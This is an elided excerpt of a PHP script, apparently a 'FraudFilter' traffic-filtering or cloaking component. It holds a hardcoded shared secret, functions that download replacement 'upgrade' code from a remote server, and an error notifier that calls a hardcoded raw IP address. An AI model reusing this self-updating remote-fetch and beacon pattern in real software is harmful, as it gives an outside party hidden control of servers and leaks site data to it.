...
class FraudFilterDetector_pe4pl {
    ...
    function isSignatureValid($sign, $time) {
        $str = '1cb8da20-f73d-4985-9820-3157031abfda.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 1cb8da20-f73d-4985-9820-3157031abfda',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 1cb8da20-f73d-4985-9820-3157031abfda';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 1cb8da20-f73d-4985-9820-3157031abfda';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=pe4pl&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_pe4pl = new FraudFilterDetector_pe4pl();
$fraudFilterDetector_pe4pl->check();
